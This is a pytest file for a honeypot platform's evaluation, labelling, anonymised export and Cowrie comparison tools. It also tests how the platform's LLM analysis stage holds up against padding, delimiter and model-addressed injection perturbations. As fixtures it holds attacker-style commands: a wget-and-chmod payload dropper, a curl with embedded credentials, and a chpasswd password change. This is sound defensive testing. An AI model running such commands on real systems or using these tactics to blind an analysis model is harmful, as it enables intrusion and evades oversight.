"""The evaluation, labelling, export and comparison tools.

All offline: the model stages are replaced by small fakes, and the inputs
are a handful of short standard commands. Nothing here is a measurement.
"""

import argparse
import json
from contextlib import asynccontextmanager

import pytest

from app.tools import compare_cowrie, eval_injection, eval_pipeline, export_dataset, label_sessions
from app.tools.session_io import load_labels, load_sessions, normalise, write_jsonl
from test_operations_round import ATTACK, _ingest, _node


def _session(session_id, commands, **extra):
    return {"session_id": session_id, "protocol": "ssh", "attacker_ip": "203.0.113.5",
            "started_at": "2026-01-15T10:30:00Z", "duration_seconds": 30.0, "commands": commands, **extra}


@pytest.fixture
def stored_sessions(db_session, monkeypatch):
    """Point the tools' own database sessions at the test database."""
    from app.core import database

    @asynccontextmanager
    async def factory():
        yield db_session

    monkeypatch.setattr(database, "async_session_factory", factory)
    return db_session


# -- reading sessions ----------------------------------------------------------

class TestSessionFiles:
    def test_the_engines_stored_record_is_understood(self):
        record = {
            "session_id": "abc", "protocol": "SSH", "source_ip": "203.0.113.5", "source_port": 4000,
            "start_time": "2026-01-15T10:30:00+00:00", "duration_seconds": 12.5,
            "commands": [{"command": "uname -a", "output": "Linux", "exit_code": 0, "timestamp": 1.0}],
            "authentication_attempts": [{"username": "root", "password": "x", "success": False}],
            "network_events": [{"event_type": "file_download", "url": "http://203.0.113.9/a"}],
            "files_uploaded": [{"filename": "a", "sha256": "0" * 64}],
        }
        session = normalise(record)
        assert session["attacker_ip"] == "203.0.113.5" and session["protocol"] == "ssh"
        assert session["commands"] == ["uname -a"] and session["transcript"][0]["output"] == "Linux"
        assert session["failed_logins"] == 1 and session["events"][0]["url"].endswith("/a")

    def test_blank_and_unknown_labels_are_not_answers(self, tmp_path):
        path = tmp_path / "labels.jsonl"
        write_jsonl(path, [
            {"session_id": "a", "category": "Exploitation"}, {"session_id": "b", "category": ""},
            {"session_id": "c", "category": "malicious"},
        ])
        assert load_labels(str(path)) == {"a": {"session_id": "a", "category": "exploitation"}}


# -- C4: eval_pipeline ------------------------------------------------------------

class TestEvalPipeline:
    def test_the_metrics_are_computed_as_defined(self):
        pairs = [("benign", "benign"), ("benign", "reconnaissance"),
                 ("exploitation", "exploitation"), ("exploitation", "exploitation")]
        matrix = eval_pipeline.confusion(pairs)
        assert matrix["matrix"][0][:2] == [1, 1] and matrix["matrix"][2][2] == 2
        classes = eval_pipeline.per_class(pairs)
        assert classes["benign"] == {"precision": 1.0, "recall": 0.5, "f1": 0.6667, "support": 2}
        assert classes["reconnaissance"]["precision"] == 0.0 and classes["reconnaissance"]["support"] == 0
        assert eval_pipeline.accuracy(pairs) == 0.75
        low, high = eval_pipeline.bootstrap_interval(pairs, eval_pipeline.accuracy, 200)
        assert 0.0 <= low <= 0.75 <= high <= 1.0

    async def test_a_tiny_set_gets_matrices_a_warning_and_no_headline(self):
        sessions = [normalise(_session("a", ["uname -a"])), normalise(_session("b", [])),
                    normalise(_session("c", ["wget http://203.0.113.9/a -O /tmp/a"]))]
        labels = {"a": {"category": "reconnaissance"}, "b": {"category": "benign"},
                  "c": {"category": "exploitation"}}
        report = await eval_pipeline.evaluate(sessions, labels, resamples=50, dataset_description="unit test")
        assert report["headline_figures"] is False and "Only 3 labelled" in report["warning"]
        rules = report["layers"]["rules"]
        assert "accuracy" not in rules and rules["confusion_matrix"]["matrix"][1][1] == 1
        assert report["dataset"]["by_label"]["exploitation"] == 1 and report["git_revision"]
        assert report["technique_id_validity"]["rules"]["ssh"]["valid"] >= 2
        assert report["rule_layer_timing"][0]["sessions"] == 3
        # No endpoint configured and none asked for: the model layers are absent.
        assert set(report["layers"]) == {"rules", "flow_classifier", "pipeline"}

    async def test_headline_figures_come_with_intervals_and_the_warning_stays(self):
        sessions = [normalise(_session(str(i), ["uname -a"])) for i in range(6)]
        labels = {str(i): {"category": "reconnaissance"} for i in range(6)}
        report = await eval_pipeline.evaluate(sessions, labels, resamples=50, allow_small=True)
        rules = report["layers"]["rules"]
        assert rules["accuracy"] == 1.0 and rules["accuracy_ci95"] == [1.0, 1.0]
        assert report["warning"] and "No labelled sessions in" in report["warning"]


# -- label_sessions -----------------------------------------------------------------

class TestLabelSessions:
    async def test_labels_round_trip_through_the_database(self, client, auth_headers, stored_sessions, tmp_path):
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, {**ATTACK, "credentials": [
            {"username": "root", "password": "hunter22", "success": False}]})
        out, labels = tmp_path / "sessions.jsonl", tmp_path / "labels.jsonl"
        args = argparse.Namespace(out=str(out), labels=str(labels), since=None, protocol=None, limit=None,
                                  only_labelled=False, with_verdict=False)
        assert await label_sessions.export(args) == 0
        [exported] = load_sessions(str(out))
        assert exported["commands"] == ATTACK["commands"]
        assert "hunter22" not in out.read_text() and "pipeline_verdict" not in out.read_text()

        [template] = [json.loads(line) for line in labels.read_text().splitlines()]
        assert template["category"] == ""
        write_jsonl(labels, [{**template, "category": "exploitation"}, {"session_id": "x", "category": "bogus"}])
        args = argparse.Namespace(labels=str(labels), labelled_by="tester", dry_run=False)
        assert await label_sessions.import_labels(args) == 0
        detail = (await client.get(f"/api/v1/sessions/{result['session_id']}", headers=headers)).json()
        assert detail["signals"]["label"]["category"] == "exploitation"
        assert detail["signals"]["label"]["labelled_by"] == "tester"


# -- C6: export_dataset ---------------------------------------------------------------

class TestExportDataset:
    def test_pseudonyms_are_keyed_stable_and_keep_the_network(self):
        one, other = export_dataset.Anonymiser(b"k" * 32), export_dataset.Anonymiser(b"j" * 32)
        a, b = one.address("203.0.113.5"), one.address("203.0.113.77")
        assert a == one.address("203.0.113.5") and a["source"] != b["source"]
        assert a["network"] == b["network"] and a["family"] == "ipv4"
        assert a["source"] != other.address("203.0.113.5")["source"]
        assert "203.0.113" not in json.dumps([a, b])

    def test_passwords_become_a_hash_and_a_length_class(self):
        anonymiser = export_dataset.Anonymiser(b"k" * 32)
        hashed = anonymiser.password("hunter22")
        assert hashed == anonymiser.password("hunter22") and hashed["length_class"] == "6-8"
        assert "hunter22" not in json.dumps(hashed)
        assert [export_dataset.length_class(n) for n in (0, 5, 8, 12, 20, 21)] == ["0", "1-5", "6-8", "9-12", "13-20", "21+"]

    def test_secrets_in_free_text_are_masked(self):
        anonymiser = export_dataset.Anonymiser(b"k" * 32)
        text = anonymiser.text(
            "curl http://admin:s3cret@198.51.100.9/x; mysql -u root --password hunter22; "
            "export API_KEY=abc123; echo 'root:newpass' | chpasswd; mail me@example.org; ssh 203.0.113.5",
            own_address="203.0.113.5", tried_passwords=["hunter22"],
        )
        for secret in ("s3cret", "hunter22", "abc123", "newpass", "me@example.org", "203.0.113.5"):
            assert secret not in text
        assert "198.51.100.9" in text, "the infrastructure an attacker reached for is kept"

    def test_a_key_is_required(self, monkeypatch):
        monkeypatch.delenv("EXPORT_PSEUDONYM_KEY", raising=False)
        with pytest.raises(SystemExit):
            export_dataset.load_key(argparse.Namespace(key_file=None))

    async def test_the_export_and_its_card(self, client, auth_headers, stored_sessions, tmp_path, monkeypatch):
        monkeypatch.setenv("EXPORT_PSEUDONYM_KEY", "k" * 32)
        node_id, _ = await _node(client, auth_headers)
        await _ingest(client, node_id, {
            **ATTACK, "uploads": [{"filename": "m.sh", "sha256": "a" * 64, "size": 10}],
            "credentials": [{"username": "root", "password": "hunter22", "success": False}],
            "fingerprints": {"hassh": "b" * 32},
        })
        out, card = tmp_path / "out.jsonl", tmp_path / "card.json"
        args = argparse.Namespace(out=str(out), card=str(card), since=None, until=None,
                                  exclude_scanners=False, key_file=None, title=None, description="unit test")
        assert await export_dataset.export(args) == 0
        text = out.read_text()
        assert ATTACK["attacker_ip"] not in text and "hunter22" not in text and "content_b64" not in text
        [record] = [json.loads(line) for line in text.splitlines()]
        assert record["source"].startswith("src-") and record["file_hashes"] == ["a" * 64]
        assert record["commands"][0]["command"] == "uname -a" and record["fingerprints"] == {"hassh": "b" * 32}
        described = json.loads(card.read_text())
        assert described["sessions"] == 1 and described["counts"]["unique_sources"] == 1
        assert set(record) <= set(described["fields"]) and described["anonymisation"]["key_id"]
        assert described["collection_window"]["first"] and described["git_revision"]
        assert "k" * 32 not in card.read_text()


# -- C7: compare_cowrie -------------------------------------------------------------------

class TestCompareCowrie:
    def test_mann_whitney_on_separated_and_identical_samples(self):
        apart = compare_cowrie.mann_whitney_u([1, 2, 3, 4, 5, 6, 7, 8], [11, 12, 13, 14, 15, 16, 17, 18])
        assert apart["u"] == 0.0 and apart["p_value"] < 0.01 and apart["common_language_effect"] == 0.0
        same = compare_cowrie.mann_whitney_u([1, 2, 3, 4], [1, 2, 3, 4])
        assert same["p_value"] > 0.9 and same["small_sample"] is True
        # Hand-checked: ranks of a are 1, 2.5, 5 -> U_a = 2.5.
        tied = compare_cowrie.mann_whitney_u([1, 2, 4], [2, 3, 5])
        assert tied["u"] == 2.5
        assert compare_cowrie.mann_whitney_u([], [1]) is None
        assert compare_cowrie.mann_whitney_u([2, 2], [2, 2]) is None

    def test_a_cowrie_log_becomes_sessions_and_a_comparison(self, tmp_path):
        log = tmp_path / "cowrie.json"
        write_jsonl(log, [
            {"eventid": "cowrie.session.connect", "session": "s1", "src_ip": "198.51.100.20",
             "timestamp": "2026-01-15T10:00:00.000000Z"},
            {"eventid": "cowrie.login.success", "session": "s1", "username": "root", "password": "x",
             "timestamp": "2026-01-15T10:00:01.000000Z"},
            {"eventid": "cowrie.command.input", "session": "s1", "input": "uname -a",
             "timestamp": "2026-01-15T10:00:02.000000Z"},
            {"eventid": "cowrie.session.file_download", "session": "s1", "url": "http://203.0.113.9/a",
             "shasum": "A" * 64, "timestamp": "2026-01-15T10:00:03.000000Z"},
            {"eventid": "cowrie.session.closed", "session": "s1", "duration": 4.5,
             "timestamp": "2026-01-15T10:00:04.500000Z"},
            {"eventid": "cowrie.session.connect", "session": "s2", "src_ip": "198.51.100.21",
             "timestamp": "2026-01-15T11:00:00.000000Z"},
            {"eventid": "cowrie.login.success", "session": "s2", "timestamp": "2026-01-15T11:00:01.000000Z"},
        ])
        theirs = compare_cowrie.cowrie_sessions(str(log))
        assert len(theirs) == 2 and theirs[0]["duration"] == 4.5 and theirs[0]["hashes"] == ["a" * 64]

        ours_file = tmp_path / "ours.jsonl"
        write_jsonl(ours_file, [
            {"source": "src-1", "started_at": "2026-01-15T10:30:00+00:00", "duration_seconds": 9.0,
             "commands": [{"command": "uname -a"}], "credentials": [{"success": True}],
             "events": [{"event_type": "file_download", "url": "http://203.0.113.9/a"}], "file_hashes": ["a" * 64]},
            {"source": "src-2", "started_at": "2026-02-01T00:00:00+00:00", "duration_seconds": 1.0, "commands": []},
        ])
        ours = compare_cowrie.honeysentinel_sessions(str(ours_file))
        # With no period given, the one both logs cover is used.
        shared = compare_cowrie.compare(ours, theirs)
        assert shared["period"]["since"].startswith("2026-01-15T10:30") and shared["period"]["until"].startswith("2026-01-15T11:00")
        report = compare_cowrie.compare(
            ours, theirs,
            since=compare_cowrie._epoch("2026-01-15T00:00:00Z"), until=compare_cowrie._epoch("2026-01-16T00:00:00Z"),
        )
        assert report["excluded_outside_period"] == {"honeysentinel": 1, "cowrie": 0}
        assert report["honeysentinel"]["login_to_command_conversion"] == 1.0
        assert report["cowrie"]["login_to_command_conversion"] == 0.5
        assert report["cowrie"]["distinct_command_sequences"] == 1
        assert report["overlap"]["download_urls_seen_by_both"] == ["http://203.0.113.9/a"]
        assert report["overlap"]["command_sequences_seen_by_both"] == 1
        assert report["warning"] and report["git_revision"]
        assert "HoneySentinel" in compare_cowrie.table(report)


# -- C5: eval_injection -------------------------------------------------------------------

DROPPER = ["uname -a", "wget http://203.0.113.9/a -O /tmp/a", "chmod +x /tmp/a"]


class TestEvalInjection:
    def test_each_perturbation_does_what_its_name_says(self):
        names = eval_injection.perturbations(pad_lines=5)
        padded = eval_injection.apply("pad_before", DROPPER, "ssh", names["pad_before"])
        assert padded[:5] == [eval_injection.PADDING_LINE] * 5 and padded[5:] == DROPPER
        assert eval_injection.apply("pad_after", DROPPER, "ssh", names["pad_after"])[:3] == DROPPER
        late = eval_injection.apply("move_late", ["echo hi"] + DROPPER, "ssh", names["move_late"])
        assert late[0] == "echo hi" and late[-3:] == DROPPER
        assert eval_injection.apply("delimiter", DROPPER, "ssh", names["delimiter"])[-1] == eval_injection.DELIMITER_LINE
        assert eval_injection.apply("addressed", DROPPER, "ssh", names["addressed"])[-1] == eval_injection.ADDRESSED_LINE
        with pytest.raises(ValueError):
            eval_injection.apply("nonsense", DROPPER, "ssh", {})

    async def test_a_model_that_reads_only_the_start_is_caught_by_padding(self):
        async def reads_the_start(commands, protocol):
            seen = "\n".join(commands)[:200]
            techniques = [{"id": "T1105", "name": "Ingress Tool Transfer"}] if "wget" in seen else []
            return {"mitre_techniques": techniques, "iocs": {"hosts": [], "urls": [], "files": []}}

        report = await eval_injection.run([normalise(_session("a", DROPPER))], None, reads_the_start, pad_lines=100)
        results = report["results"]
        assert results["pad_before"]["llm_techniques_changed"] == 1 and results["pad_before"]["weakened"] == 1
        assert results["pad_after"]["weakened"] == 0 and results["addressed"]["weakened"] == 0
        assert report["warning"] and report["stages"] == {"triage": False, "language_model": True}

    async def test_the_shared_window_keeps_the_activity_in_view(self):
        from app.ai.llm import chimera

        async def reads_the_window(commands, protocol):
            seen = chimera.window(commands, protocol).text
            techniques = [{"id": "T1105", "name": "Ingress Tool Transfer"}] if "wget" in seen else []
            return {"mitre_techniques": techniques, "iocs": {"hosts": [], "urls": [], "files": []}}

        async def triage(commands, protocol):
            return {"category": "exploitation", "p_low": 0.05, "p_compromise": 0.95}

        report = await eval_injection.run([normalise(_session("a", DROPPER))], triage, reads_the_window, pad_lines=2000)
        for name, tally in report["results"].items():
            assert tally["weakened"] == 0, name
            assert tally["flagged_lines_dropped_from_window"] == 0, name
            assert tally["triage_route_changed"] == 0, name
